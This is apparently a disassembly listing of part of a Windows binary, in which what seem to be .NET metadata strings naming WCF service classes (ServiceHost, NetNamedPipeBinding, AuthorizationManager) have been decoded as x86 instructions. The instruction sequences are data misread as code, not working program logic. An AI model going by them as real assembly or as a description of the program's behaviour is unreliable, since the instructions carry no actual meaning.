  4034e4:	je     0x40354b
  4034e6:	ins    DWORD PTR es:[edi],dx
  4034e7:	cs push edx
  4034e9:	gs jae 0x40355b
  4034ec:	jne    0x403560
  4034ee:	arpl   WORD PTR [ebp+0x73],sp
  4034f1:	add    BYTE PTR [ebx+0x61],dl
  4034f4:	je     0x40355b
  4034f6:	ins    BYTE PTR es:[edi],dx
  4034f7:	ins    BYTE PTR es:[edi],dx
  4034f8:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  403500:	popa   
  403501:	arpl   WORD PTR [esi+edx*2+0x65],si
  403505:	jb     0x40357a
  403507:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40350e:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  403515:	gs jne 0x40358c
  403518:	jb     0x40357b
  40351a:	ins    BYTE PTR es:[edi],dx
  40351b:	push   edx
  40351c:	gs jae 0x40358e
  40351f:	jne    0x403593
  403521:	arpl   WORD PTR [ebp+0x73],sp
  403524:	dec    esp
  403525:	popa   
  403526:	outs   dx,BYTE PTR ds:[esi]
  403527:	addr16 jne 0x40358b
  40352a:	addr16 gs inc ecx
  40352d:	je     0x4035a3
  40352f:	jb     0x40359a
  403531:	bound  esi,QWORD PTR [ebp+0x74]
  403534:	add    BYTE PTR gs:[ecx+0x73],al
  403538:	jae    0x40359f
  40353a:	ins    DWORD PTR es:[edi],dx
  40353b:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40353f:	gs ins BYTE PTR es:[edi],dx
  403541:	popa   
  403542:	jns    0x403597
  403544:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  40354b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403552:	jae    0x4035c7
  403554:	gs ins DWORD PTR es:[edi],dx
  403556:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  40355a:	gs jns 0x4035a3
  40355d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  403565:	bound  esi,QWORD PTR [ebp+0x74]
  403568:	add    BYTE PTR gs:[ecx+0x73],al
  40356c:	jae    0x4035d3
  40356e:	ins    DWORD PTR es:[edi],dx
  40356f:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  403573:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  40357a:	gs dec ebx
  40357c:	gs jns 0x4035c0
  40357f:	je     0x4035f5
  403581:	jb     0x4035ec
  403583:	bound  esi,QWORD PTR [ebp+0x74]
  403586:	add    BYTE PTR gs:[ebx+0x79],dl
  40358a:	jae    0x403600
  40358c:	gs ins DWORD PTR es:[edi],dx
  40358e:	cs push edx
  403590:	jne    0x403600
  403592:	je     0x4035fd
  403594:	ins    DWORD PTR es:[edi],dx
  403595:	gs cs inc ebx
  403598:	outs   dx,DWORD PTR ds:[esi]
  403599:	ins    DWORD PTR es:[edi],dx
  40359a:	jo     0x403605
  40359c:	ins    BYTE PTR es:[edi],dx
  40359d:	gs jb  0x4035f3
  4035a0:	gs jb  0x403619
  4035a3:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  4035aa:	outs   dx,BYTE PTR ds:[esi]
  4035ab:	je     0x403616
  4035ad:	ins    DWORD PTR es:[edi],dx
  4035ae:	gs inc ebx
  4035b0:	outs   dx,DWORD PTR ds:[esi]
  4035b1:	ins    DWORD PTR es:[edi],dx
  4035b2:	jo     0x403615
  4035b4:	je     0x40361f
  4035b6:	bound  ebp,QWORD PTR [ecx+0x6c]
  4035b9:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4035c1:	bound  esi,QWORD PTR [ebp+0x74]
  4035c4:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4035c9:	jne    0x403632
  4035cb:	addr16 popa 
  4035cd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4035d1:	je     0x403647
  4035d3:	jb     0x40363e
  4035d5:	bound  esi,QWORD PTR [ebp+0x74]
  4035d8:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4035dd:	jne    0x403646
  4035df:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  4035e7:	jae    0x4035e9
  4035e9:	inc    ebx
  4035ea:	outs   dx,DWORD PTR ds:[esi]
  4035eb:	ins    DWORD PTR es:[edi],dx
  4035ec:	jo     0x403657
  4035ee:	ins    BYTE PTR es:[edi],dx
  4035ef:	popa   
  4035f0:	je     0x40365b
  4035f2:	outs   dx,DWORD PTR ds:[esi]
  4035f3:	outs   dx,BYTE PTR ds:[esi]
  4035f4:	push   edx
  4035f5:	gs ins BYTE PTR es:[edi],dx
  4035f7:	popa   
  4035f8:	js     0x40365b
  4035fa:	je     0x403665
  4035fc:	outs   dx,DWORD PTR ds:[esi]
  4035fd:	outs   dx,BYTE PTR ds:[esi]
  4035fe:	jae    0x403641
  403600:	je     0x403676
  403602:	jb     0x40366d
  403604:	bound  esi,QWORD PTR [ebp+0x74]
  403607:	add    BYTE PTR gs:[ebx+0x56],al
  40360b:	inc    ecx
  40360c:	outs   dx,BYTE PTR ds:[esi]
  40360d:	popa   
  40360e:	ins    BYTE PTR es:[edi],dx
  40360f:	jns    0x403684
  403611:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  403618:	arpl   WORD PTR [ebp+0x0],sp
  40361b:	inc    ebp
  40361c:	outs   dx,BYTE PTR ds:[esi]
  40361d:	jbe    0x403688
  40361f:	jb     0x403690
  403621:	outs   dx,BYTE PTR ds:[esi]
  403622:	ins    DWORD PTR es:[edi],dx
  403623:	outs   dx,BYTE PTR gs:[esi]
  403625:	je     0x403627
  403627:	inc    ebp
  403628:	js     0x403693
  40362a:	je     0x40362c
  40362c:	push   ebx
  40362d:	jns    0x4036a2
  40362f:	je     0x403696
  403631:	ins    DWORD PTR es:[edi],dx
  403632:	cs push ebx
  403634:	gs jb  0x4036ad
  403637:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40363e:	ins    BYTE PTR es:[edi],dx
  40363f:	add    BYTE PTR [ebx+0x65],dl
  403642:	jb     0x4036ba
  403644:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  40364b:	add    BYTE PTR [esi+0x65],cl
  40364e:	je     0x40369e
  403650:	popa   
  403651:	ins    DWORD PTR es:[edi],dx
  403652:	gs fs push eax
  403655:	imul   esi,DWORD PTR [eax+0x65],0x646e6942
  40365c:	imul   ebp,DWORD PTR [esi+0x67],0x6d695400
  403663:	gs push ebx
  403665:	jo     0x4036c8
  403667:	outs   dx,BYTE PTR ds:[esi]
  403668:	add    BYTE PTR [ebp+0x61],cl
  40366b:	js     0x4036c3
  40366d:	popa   
  40366e:	ins    BYTE PTR es:[edi],dx
  40366f:	jne    0x4036d6
  403671:	add    BYTE PTR [ebx+0x79],dl
  403674:	jae    0x4036ea
  403676:	gs ins DWORD PTR es:[edi],dx
  403678:	cs push ebx
  40367a:	gs jb  0x4036f3
  40367d:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  403684:	ins    BYTE PTR es:[edi],dx
  403685:	cs inc ebx
  403687:	push   0x656e6e61
  40368c:	ins    BYTE PTR es:[edi],dx
  40368d:	jae    0x40368f
  40368f:	inc    edx
  403690:	imul   ebp,DWORD PTR [esi+0x64],0x676e69
  403697:	jae    0x4036fe
  403699:	je     0x4036fa
  40369b:	push   edx
  40369c:	arpl   WORD PTR gs:[ebp+0x69],sp
  4036a0:	jbe    0x403707
  4036a2:	push   esp
  4036a3:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  4036aa:	push   esp
  4036ab:	jns    0x40371d
  4036ad:	add    BYTE PTR gs:[edx+0x75],dl
  4036b1:	outs   dx,BYTE PTR ds:[esi]
  4036b2:	je     0x40371d
  4036b4:	ins    DWORD PTR es:[edi],dx
  4036b5:	gs push esp
  4036b7:	jns    0x403729
  4036b9:	gs dec eax
  4036bb:	popa   
  4036bc:	outs   dx,BYTE PTR ds:[esi]
  4036bd:	fs ins BYTE PTR es:[edi],dx
  4036bf:	add    BYTE PTR gs:[edi+0x65],al
  4036c3:	je     0x403719
  4036c5:	jns    0x403737
  4036c7:	gs inc esi
  4036c9:	jb     0x40373a
  4036cb:	ins    DWORD PTR es:[edi],dx
  4036cc:	dec    eax
  4036cd:	popa   
  4036ce:	outs   dx,BYTE PTR ds:[esi]
  4036cf:	fs ins BYTE PTR es:[edi],dx
  4036d1:	add    BYTE PTR gs:[ebx+0x79],dl
  4036d5:	jae    0x40374b
  4036d7:	gs ins DWORD PTR es:[edi],dx
  4036d9:	cs push ebx
  4036db:	gs jb  0x403754
  4036de:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4036e5:	ins    BYTE PTR es:[edi],dx
  4036e6:	cs inc esp
  4036e8:	gs jae 0x40374e
  4036eb:	jb     0x403756
  4036ed:	jo     0x403763
  4036ef:	imul   ebp,DWORD PTR [edi+0x6e],0x72655300
  4036f6:	jbe    0x403761
  4036f8:	arpl   WORD PTR [ebp+0x45],sp
  4036fb:	outs   dx,BYTE PTR ds:[esi]
  4036fc:	fs jo  0x40376e
  4036ff:	imul   ebp,DWORD PTR [esi+0x74],0x64644100
  403706:	push   ebx
  403707:	gs jb  0x403780
  40370a:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  403711:	outs   dx,DWORD PTR ds:[esi]
  403712:	imul   ebp,DWORD PTR [esi+0x74],0x72655300
  403719:	jbe    0x403784
  40371b:	arpl   WORD PTR [ebp+0x48],sp
  40371e:	outs   dx,DWORD PTR ds:[esi]
  40371f:	jae    0x403795
  403721:	inc    edx
  403722:	popa   
  403723:	jae    0x40378a
  403725:	add    BYTE PTR [ebx+0x65],dl
  403728:	jb     0x4037a0
  40372a:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  403731:	outs   dx,DWORD PTR ds:[esi]
  403732:	jb     0x40379d
  403734:	jp     0x403797
  403736:	je     0x4037a1
  403738:	outs   dx,DWORD PTR ds:[esi]
  403739:	outs   dx,BYTE PTR ds:[esi]
  40373a:	inc    edx
  40373b:	gs push 0x6f697661
  403741:	jb     0x403743
  403743:	addr16 gs je 0x4037a6
  403747:	inc    ecx
  403748:	jne    0x4037be
  40374a:	push   0x7a69726f
  40374f:	popa   
  403750:	je     0x4037bb
  403752:	outs   dx,DWORD PTR ds:[esi]
  403753:	outs   dx,BYTE PTR ds:[esi]
  403754:	add    BYTE PTR [ebx+0x69],dl
  403757:	outs   dx,BYTE PTR ds:[esi]
  403758:	addr16 jne 0x4037c7
  40375b:	popa   
  40375c:	jb     0x40379f
  40375e:	jne    0x4037d4
  403760:	push   0x7a69726f
  403765:	popa   
  403766:	je     0x4037d1
  403768:	outs   dx,DWORD PTR ds:[esi]
  403769:	outs   dx,BYTE PTR ds:[esi]
  40376a:	dec    ebp
  40376b:	popa   
  40376c:	outs   dx,BYTE PTR ds:[esi]
  40376d:	popa   
  40376e:	addr16 gs jb 0x403772
  403772:	push   ebx
  403773:	gs jb  0x4037ec
  403776:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  40377d:	outs   dx,DWORD PTR ds:[esi]
  40377e:	jb     0x4037e9
  403780:	jp     0x4037e3
  403782:	je     0x4037ed
  403784:	outs   dx,DWORD PTR ds:[esi]
  403785:	outs   dx,BYTE PTR ds:[esi]
  403786:	dec    ebp
  403787:	popa   
  403788:	outs   dx,BYTE PTR ds:[esi]
  403789:	popa   
  40378a:	addr16 gs jb 0x40378e
  40378e:	jae    0x4037f5
  403790:	je     0x4037f1
  403792:	push   ebx
  403793:	gs jb  0x40380c
  403796:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  40379d:	outs   dx,DWORD PTR ds:[esi]
  40379e:	jb     0x403809
  4037a0:	jp     0x403803
  4037a2:	je     0x40380d
  4037a4:	outs   dx,DWORD PTR ds:[esi]
  4037a5:	outs   dx,BYTE PTR ds:[esi]
  4037a6:	dec    ebp
  4037a7:	popa   
  4037a8:	outs   dx,BYTE PTR ds:[esi]
  4037a9:	popa   
  4037aa:	addr16 gs jb 0x4037ae
  4037ae:	inc    ebx
  4037af:	outs   dx,DWORD PTR ds:[esi]
  4037b0:	ins    DWORD PTR es:[edi],dx
  4037b1:	ins    DWORD PTR es:[edi],dx
  4037b2:	jne    0x403822
  4037b4:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4037bb:	dec    edi
  4037bc:	bound  ebp,QWORD PTR [edx+0x65]
  4037bf:	arpl   WORD PTR [eax+eax*1+0x4f],si
  4037c3:	jo     0x40382a
  4037c5:	outs   dx,BYTE PTR ds:[esi]
  4037c6:	add    BYTE PTR [ebx+0x65],dl
  4037c9:	jb     0x403841
  4037cb:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  4037d2:	gs jae 0x403848
  4037d5:	add    BYTE PTR [ebx+0x69],dl
  4037d8:	outs   dx,BYTE PTR ds:[si]
  4037da:	popa   
  4037db:	ins    BYTE PTR es:[edi],dx
  4037dc:	dec    esi
  4037dd:	popa   
  4037de:	ins    DWORD PTR es:[edi],dx
  4037df:	gs fs inc ebp
  4037e2:	jbe    0x403849
  4037e4:	outs   dx,BYTE PTR ds:[esi]
  4037e5:	je     0x4037e7
  4037e7:	push   esp
  4037e8:	popa   
  4037e9:	jae    0x403856
  4037eb:	inc    esi
  4037ec:	popa   
  4037ed:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4037f1:	jns    0x4037f3
  4037f3:	addr16 gs je 0x403856
  4037f7:	inc    esi
  4037f8:	popa   
  4037f9:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4037fd:	jns    0x4037ff
  4037ff:	push   edi
  403800:	popa   
  403801:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x69784572
  403809:	je     0x40380b
  40380b:	inc    ecx
  40380c:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403810:	outs   dx,BYTE PTR ds:[esi]
  403811:	add    BYTE PTR [ebx+0x74],dl
  403814:	popa   
  403815:	jb     0x40388b
  403817:	dec    esi
  403818:	gs ja  0x40381b
  40381b:	push   edi
  40381c:	popa   
  40381d:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x6c430079
  403825:	outs   dx,DWORD PTR ds:[esi]
  403826:	jae    0x40388d
  403828:	add    BYTE PTR [ebx+0x75],dl
  40382b:	jo     0x40389d
  40382d:	outs   dx,DWORD PTR ds:[esi]
  40382e:	jb     0x4038a4
  403830:	add    BYTE PTR [ebp+0x78],al
  403833:	arpl   WORD PTR [ebp+0x70],sp
  403836:	je     0x4038a1
  403838:	outs   dx,DWORD PTR ds:[esi]
  403839:	outs   dx,BYTE PTR ds:[esi]
  40383a:	add    BYTE PTR [edx+esi*2+0x61],dl
  40383e:	arpl   WORD PTR [ebp+0x45],sp
  403841:	js     0x4038a6
  403843:	gs jo  0x4038ba
  403846:	imul   ebp,DWORD PTR [edi+0x6e],0x63617453
  40384d:	imul   eax,DWORD PTR [eax],0x57
  403850:	popa   
  403851:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  403859:	inc    ebx
  40385a:	popa   
  40385b:	outs   dx,BYTE PTR ds:[esi]
  40385c:	outs   dx,BYTE PTR ds:[esi]
  40385d:	outs   dx,DWORD PTR ds:[esi]
  40385e:	je     0x4038a2
  403860:	gs dec edi
  403862:	jo     0x4038c9
  403864:	outs   dx,BYTE PTR ds:[esi]
  403865:	gs fs inc ebp
  403868:	js     0x4038cd
  40386a:	gs jo  0x4038e1
  40386d:	imul   ebp,DWORD PTR [edi+0x6e],0x64644100
  403874:	jb     0x4038db
  403876:	jae    0x4038eb
  403878:	inc    ecx
  403879:	ins    BYTE PTR es:[edi],dx
  40387a:	jb     0x4038e1
  40387c:	popa   
  40387d:	fs jns 0x4038c9
  403880:	outs   dx,BYTE PTR ds:[esi]
  403881:	push   ebp
  403882:	jae    0x4038e9
  403884:	inc    ebp
  403885:	js     0x4038ea
  403887:	gs jo  0x4038fe
  40388a:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  403891:	imul   ebp,DWORD PTR [esi+0x67],0x706d4500
  403898:	je     0x403913
  40389a:	add    BYTE PTR [ebx+0x79],dl
  40389d:	jae    0x403913
  40389f:	gs ins DWORD PTR es:[edi],dx
  4038a1:	cs inc edi
  4038a3:	ins    BYTE PTR es:[edi],dx
  4038a4:	outs   dx,DWORD PTR ds:[esi]
  4038a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4038a8:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4038af:	add    BYTE PTR [ebx+0x75],al
  4038b2:	ins    BYTE PTR es:[edi],dx
  4038b3:	je     0x40392a
  4038b5:	jb     0x40391c
  4038b7:	dec    ecx
  4038b8:	outs   dx,BYTE PTR ds:[esi]
  4038b9:	outs   dx,WORD PTR ds:[esi]
  4038bb:	add    BYTE PTR [edi+0x65],ah
  4038be:	je     0x40391f
  4038c0:	dec    ecx
  4038c1:	outs   dx,BYTE PTR ds:[esi]
  4038c2:	jbe    0x403925
  4038c4:	jb     0x40392f
  4038c6:	popa   
  4038c7:	outs   dx,BYTE PTR ds:[esi]
  4038c8:	je     0x40390d
  4038ca:	jne    0x403938
  4038cc:	je     0x403943
  4038ce:	jb     0x403935
  4038d0:	add    BYTE PTR [edi+ebp*2+0x53],dl
  4038d4:	je     0x403948
  4038d6:	imul   ebp,DWORD PTR [esi+0x67],0x6f464900
  4038dd:	jb     0x40394c
  4038df:	popa   
  4038e0:	je     0x403932
  4038e2:	jb     0x403953
  4038e4:	jbe    0x40394f
  4038e6:	fs gs jb 0x4038ea
  4038ea:	inc    esi
  4038eb:	outs   dx,DWORD PTR ds:[esi]
  4038ec:	jb     0x40395b
  4038ee:	popa   
  4038ef:	je     0x4038f1
  4038f1:	push   esp
  4038f2:	jb     0x403948
  4038f4:	jb     0x403957
  4038f6:	arpl   WORD PTR [ebp+0x0],sp
  4038f9:	dec    ecx
  4038fa:	outs   dx,BYTE PTR ds:[esi]
  4038fb:	je     0x403930
  4038fd:	xor    al,BYTE PTR [eax]
  4038ff:	push   eax
  403900:	popa   
  403901:	jb     0x403976
  403903:	add    BYTE PTR gs:[edi+0x65],al
  403907:	je     0x403959
  403909:	jb     0x40397a
  40390b:	arpl   WORD PTR [ebp+0x73],sp
  40390e:	jae    0x403952
  403910:	jns    0x40395b
  403912:	add    BYTE PTR fs:[esi+0x75],cl
  403916:	ins    DWORD PTR es:[edi],dx
  403917:	bound  esp,QWORD PTR [ebp+0x72]
  40391a:	inc    esi
  40391b:	outs   dx,DWORD PTR ds:[esi]
  40391c:	jb     0x40398b
  40391e:	popa   
  40391f:	je     0x40396a
  403921:	outs   dx,BYTE PTR ds:[esi]
  403922:	outs   dx,WORD PTR ds:[esi]
  403924:	add    BYTE PTR [edi+0x65],ah
  403927:	je     0x403988
  403929:	dec    esi
  40392a:	jne    0x403999
  40392c:	bound  esp,QWORD PTR [ebp+0x72]
  40392f:	inc    esi
  403930:	outs   dx,DWORD PTR ds:[esi]
  403931:	jb     0x4039a0
  403933:	popa   
  403934:	je     0x403936
  403936:	push   esp
  403937:	jb     0x40397c
  403939:	outs   dx,DWORD PTR ds:[esi]
  40393a:	outs   dx,BYTE PTR ds:[esi]
  40393b:	je     0x4039a2
  40393d:	js     0x4039b3
  40393f:	add    BYTE PTR [edx+0x65],dl
  403942:	jae    0x4039b3
  403944:	jne    0x4039b8
  403946:	arpl   WORD PTR [ebp+0x73],sp
  403949:	add    BYTE PTR [ebx+0x65],dh
  40394c:	je     0x4039ad
  40394e:	inc    ebx
  40394f:	jne    0x4039bd
  403951:	je     0x4039c8
  403953:	jb     0x4039ba
  403955:	add    BYTE PTR [ebp+0x69],cl
  403958:	arpl   WORD PTR [edx+0x6f],si
  40395b:	jae    0x4039cc
  40395d:	data16 je 0x40398e
  403960:	inc    ebx
  403961:	outs   dx,DWORD PTR ds:[esi]
  403962:	outs   dx,BYTE PTR ds:[esi]
  403963:	arpl   WORD PTR [ebp+0x72],si
  403966:	jb     0x4039cd
  403968:	outs   dx,BYTE PTR ds:[esi]
  403969:	arpl   WORD PTR [ecx+0x56],di
  40396c:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  403973:	gs jb  0x4039a4
  403976:	push   eax
  403977:	jb     0x4039e8
  403979:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x2e67
  403980:	push   eax
  403981:	jb     0x4039f2
  403983:	jo     0x4039ea
  403985:	jb     0x4039fb
  403987:	imul   esp,DWORD PTR [ebp+0x73],0x6f725000
  40398e:	arpl   WORD PTR [ebp+0x73],sp
  403991:	jae    0x4039fc
  403993:	outs   dx,BYTE PTR ds:[esi]
  403994:	addr16 push edx
  403996:	gs jae 0x403a08
  403999:	jne    0x403a0d
  40399b:	arpl   WORD PTR [ebp+0x0],sp
  40399e:	push   esp
  40399f:	jb     0x4039e6
  4039a1:	jb     0x403a15
  4039a3:	outs   dx,DWORD PTR ds:[esi]
  4039a4:	jb     0x4039a6
  4039a6:	push   ebx
  4039a7:	gs jb  0x403a20
  4039aa:	imul   esp,DWORD PTR [ebx+0x65],0x61686542
  4039b1:	jbe    0x403a1c
  4039b3:	outs   dx,DWORD PTR ds:[esi]
  4039b4:	jb     0x4039f7
  4039b6:	je     0x403a2c
  4039b8:	jb     0x403a23
  4039ba:	bound  esi,QWORD PTR [ebp+0x74]
  4039bd:	add    BYTE PTR gs:[ecx+eiz*2+0x73],dl
  4039c2:	imul   esp,DWORD PTR [eax+0x31],0x0
  4039c6:	addr16 gs je 0x403a29
  4039ca:	push   esp
  4039cb:	popa   
  4039cc:	jae    0x403a39
  4039ce:	add    BYTE PTR [edi+0x43],al
  4039d1:	add    BYTE PTR [ebx+0x75],dl
  4039d4:	jo     0x403a46
  4039d6:	jb     0x403a3d
  4039d8:	jae    0x403a4d
  4039da:	inc    esi
  4039db:	imul   ebp,DWORD PTR [esi+0x61],0x657a696c
  4039e2:	add    BYTE PTR [edx+esi*2+0x79],dl
  4039e6:	push   ebx
  4039e7:	gs je  0x403a3c
  4039ea:	gs jae 0x403a62
  4039ed:	ins    BYTE PTR es:[edi],dx
  4039ee:	je     0x4039f0
  4039f0:	dec    edi
  4039f1:	jo     0x403a58
  4039f3:	jb     0x403a56
  4039f5:	je     0x403a60
  4039f7:	outs   dx,DWORD PTR ds:[esi]
  4039f8:	outs   dx,BYTE PTR ds:[esi]
  4039f9:	inc    ebx
  4039fa:	outs   dx,DWORD PTR ds:[esi]
  4039fb:	outs   dx,BYTE PTR ds:[esi]
  4039fc:	je     0x403a63
  4039fe:	js     0x403a74
  403a00:	add    BYTE PTR [edi+0x65],ah
  403a03:	je     0x403a64
  403a05:	inc    ebx
  403a06:	jne    0x403a7a
  403a08:	jb     0x403a6f
  403a0a:	outs   dx,BYTE PTR ds:[esi]
  403a0b:	je     0x403a0d
  403a0d:	inc    edi
  403a0e:	gs je  0x403a54
  403a11:	popa   
  403a12:	ins    BYTE PTR es:[edi],dx
  403a13:	ins    BYTE PTR es:[edi],dx
  403a14:	bound  esp,QWORD PTR [ecx+0x63]
  403a17:	imul   eax,DWORD PTR [ebx+0x68],0x61
  403a1b:	outs   dx,BYTE PTR ds:[esi]
  403a1c:	outs   dx,BYTE PTR ds:[esi]
  403a1d:	gs ins BYTE PTR es:[edi],dx
  403a1f:	add    BYTE PTR [ebp+0x69],cl
  403a22:	arpl   WORD PTR [edx+0x6f],si
  403a25:	jae    0x403a96
  403a27:	data16 je 0x403a58
  403a2a:	inc    ebx
  403a2b:	outs   dx,DWORD PTR ds:[esi]
  403a2c:	outs   dx,BYTE PTR ds:[esi]
  403a2d:	arpl   WORD PTR [ebp+0x72],si
  403a30:	jb     0x403a97
  403a32:	outs   dx,BYTE PTR ds:[esi]
  403a33:	arpl   WORD PTR [ecx+0x56],di
  403a36:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  403a3d:	gs jb  0x403a6e
  403a40:	push   eax
  403a41:	jb     0x403ab2
  403a43:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x67
  403a4a:	dec    esp
  403a4b:	outs   dx,DWORD PTR ds:[esi]
  403a4c:	arpl   WORD PTR [ecx+0x6c],sp
  403a4f:	push   eax
  403a50:	jb     0x403ac1
  403a52:	imul   bp,WORD PTR [ebp+eiz*2+0x72],0x5300
  403a59:	jns    0x403ace
  403a5b:	je     0x403ac2
  403a5d:	ins    DWORD PTR es:[edi],dx
  403a5e:	cs inc ebx
  403a60:	outs   dx,DWORD PTR ds:[esi]
  403a61:	ins    BYTE PTR es:[edi],dx
  403a62:	ins    BYTE PTR es:[edi],dx
  403a63:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403a68:	outs   dx,BYTE PTR ds:[esi]
  403a69:	jae    0x403a99
  403a6b:	inc    edi
  403a6c:	outs   dx,BYTE PTR gs:[esi]
  403a6e:	gs jb  0x403ada
  403a71:	arpl   WORD PTR [eax],ax
  403a73:	dec    ecx
  403a74:	dec    esp
  403a75:	imul   esi,DWORD PTR [ebx+0x74],0x43003160
  403a7c:	popa   
  403a7d:	outs   dx,BYTE PTR ds:[esi]
  403a7e:	arpl   WORD PTR [ebp+0x6c],sp
  403a81:	ins    BYTE PTR es:[edi],dx
  403a82:	popa   
  403a83:	je     0x403aee
  403a85:	outs   dx,DWORD PTR ds:[esi]
  403a86:	outs   dx,BYTE PTR ds:[esi]
  403a87:	push   esp
  403a88:	outs   dx,DWORD PTR ds:[esi]
  403a89:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  403a8d:	addr16 gs je 0x403af0
  403a91:	push   esp
  403a92:	outs   dx,DWORD PTR ds:[esi]
  403a93:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  403a97:	inc    ebp
  403a98:	je     0x403b11
  403a9a:	push   esp
  403a9b:	jb     0x403afe
  403a9d:	arpl   WORD PTR [ebp+0x53],sp
  403aa0:	outs   dx,DWORD PTR ds:[esi]
  403aa1:	jne    0x403b15
  403aa3:	arpl   WORD PTR [ebp+0x0],sp
  403aa6:	push   eax
  403aa7:	jb     0x403b18
  403aa9:	imul   bp,WORD PTR [ebp+eiz*2+0x46],0x7561
  403ab0:	ins    BYTE PTR es:[edi],dx
  403ab1:	je     0x403ab3
  403ab3:	addr16 gs je 0x403b16
  403ab7:	dec    ebp
  403ab8:	gs jae 0x403b2e
  403abb:	popa   
  403abc:	add    BYTE PTR gs:[bp+0x61],al
  403ac1:	jne    0x403b2f
  403ac3:	je     0x403b0a
  403ac5:	js     0x403b2a
  403ac7:	gs jo  0x403b3e
  403aca:	imul   ebp,DWORD PTR [edi+0x6e],0x41003160
  403ad1:	addr16 addr16 jb 0x403b3a
  403ad5:	addr16 popa 
  403ad7:	je     0x403b3e
  403ad9:	inc    ebp
  403ada:	js     0x403b3f
  403adc:	gs jo  0x403b53
  403adf:	imul   ebp,DWORD PTR [edi+0x6e],0x616c4600
  403ae6:	je     0x403b5c
  403ae8:	outs   dx,BYTE PTR gs:[esi]
  403aea:	add    BYTE PTR [ebx+0x79],dl
  403aed:	jae    0x403b63
  403aef:	gs ins DWORD PTR es:[edi],dx
  403af1:	cs inc ebx
  403af3:	outs   dx,DWORD PTR ds:[esi]
  403af4:	ins    BYTE PTR es:[edi],dx
  403af5:	ins    BYTE PTR es:[edi],dx
  403af6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403afb:	outs   dx,BYTE PTR ds:[esi]
  403afc:	jae    0x403b2c
  403afe:	dec    edi
  403aff:	bound  ebp,QWORD PTR [edx+0x65]
  403b02:	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  403b06:	fs gs ins BYTE PTR es:[edi],dx
  403b09:	add    BYTE PTR [edx+0x65],dl
  403b0c:	popa   
  403b0d:	fs dec edi
  403b0f:	outs   dx,BYTE PTR ds:[esi]
  403b10:	ins    BYTE PTR es:[edi],dx
  403b11:	jns    0x403b56
  403b13:	outs   dx,DWORD PTR ds:[esi]
  403b14:	ins    BYTE PTR es:[edi],dx
  403b15:	ins    BYTE PTR es:[edi],dx
  403b16:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403b1b:	outs   dx,BYTE PTR ds:[esi]
  403b1c:	pusha  
  403b1d:	xor    DWORD PTR [eax],eax
  403b1f:	addr16 gs je 0x403b82
  403b23:	dec    ecx
  403b24:	outs   dx,BYTE PTR ds:[esi]
  403b25:	outs   dx,BYTE PTR ds:[esi]
  403b26:	gs jb  0x403b6e
  403b29:	js     0x403b8e
  403b2b:	gs jo  0x403ba2
  403b2e:	imul   ebp,DWORD PTR [edi+0x6e],0x45490073
  403b35:	outs   dx,BYTE PTR ds:[esi]
  403b36:	jne    0x403ba5
  403b38:	gs jb  0x403b9c
  403b3b:	je     0x403bac
  403b3d:	jb     0x403b9f
  403b3f:	xor    DWORD PTR [eax],eax
  403b41:	inc    edi
  403b42:	gs je  0x403b8a
  403b45:	outs   dx,BYTE PTR ds:[esi]
  403b46:	jne    0x403bb5
  403b48:	gs jb  0x403bac
  403b4b:	je     0x403bbc
  403b4d:	jb     0x403b4f
  403b4f:	push   eax
  403b50:	popa   
  403b51:	jb     0x403bc6
  403b53:	gs inc ebp
  403b55:	js     0x403bba
  403b57:	gs jo  0x403bce
  403b5a:	imul   ebp,DWORD PTR [edi+0x6e],0x65704f00
  403b61:	jb     0x403bc4
  403b63:	je     0x403bce
  403b65:	outs   dx,DWORD PTR ds:[esi]
  403b66:	outs   dx,BYTE PTR ds:[esi]
  403b67:	inc    ebx
  403b68:	popa   
  403b69:	outs   dx,BYTE PTR ds:[esi]
  403b6a:	arpl   WORD PTR [ebp+0x6c],sp
  403b6d:	gs fs inc ebp
  403b70:	js     0x403bd5
  403b72:	gs jo  0x403be9
